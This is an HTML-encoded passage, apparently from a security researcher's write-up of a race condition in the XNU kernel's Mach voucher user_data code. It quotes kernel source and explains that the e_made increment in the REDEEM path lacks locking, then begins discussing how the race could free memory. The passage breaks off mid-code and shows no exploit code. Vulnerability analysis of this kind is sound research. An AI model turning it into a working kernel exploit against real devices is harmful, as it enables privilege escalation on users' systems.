 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is only modified in two places: Firstly, in &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;when a matching &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;is found in the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_bucket&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;hash table:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.484d8847b8af9875d2025d95cd2485b68892c7b1&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.54&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* ... we found a match... */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;e_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;++;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_unlock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;();&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;The only other place is in &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;when handling the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;command during recipe parsing:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.3c0876f1c62007cdc6321660fe4a6fcf553a111c&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.55&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;switch&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* redeem of previous values is the value */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;prev_value_count&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;user_data_element_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;prev_values&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;e_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;e_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;++;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;out_value &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;prev_values&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* redeem of default is default */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;out_value &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;As mentioned before, it&amp;#39;s up to the attr managers themselves to define the semantics of redeeming a voucher; the entirety of the user_data semantics for voucher redemption are shown above. It simply returns the previous value, with &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;incremented by 1. Recall that &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;*prev_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;is either the value which was previously in this under-construction voucher for this key, or the value in the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;prev_voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;referenced by this sub-recipe.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;If you can&amp;#39;t spot the bug above in the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span&gt;&amp;nbsp;code right away that&amp;#39;s because it&amp;#39;s a bug of omission; it&amp;#39;s what&amp;#39;s &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;not&lt;/span&gt;&lt;span&gt;&amp;nbsp;there that causes the vulnerability, namely that the increment in the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span&gt;&amp;nbsp;case isn&amp;#39;t protected by the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;lock! This increment isn&amp;#39;t atomic.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;That means that if the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span&gt;&amp;nbsp;code executes in parallel with either itself on another thread or the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;elem-&amp;gt;e_made++&lt;/span&gt;&lt;span&gt;&amp;nbsp;increment in &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;on another thread, the two threads can both see the same initial value for &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;, both add one then both write the same value back; incrementing it by one when it should have been incremented by two.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;But remember, &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t a reference count! So actually making something bad happen isn&amp;#39;t as simple as just getting the two threads to align such that their increments overlap so that &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;is wrong.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Let&amp;#39;s think back to what the purpose of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is: it exists solely to ensure that if thread A drops the last ref on an &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;whilst thread B is exactly in the race window shown below, that thread&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;doesn&amp;#39;t free &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;new_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;on thread B&amp;#39;s stack:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.6678b43a7a459c004d346e8b4b835a591c986cfd&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.56&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam_get_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)(&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivam&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;command&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; previous_vals&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;previous_vals_count&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;new_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;new_flag&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;new_value_voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_release&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* WINDOW */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; val_index &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivace_reference_by_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;new_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;new_flag&lt;/span&gt;&lt;span 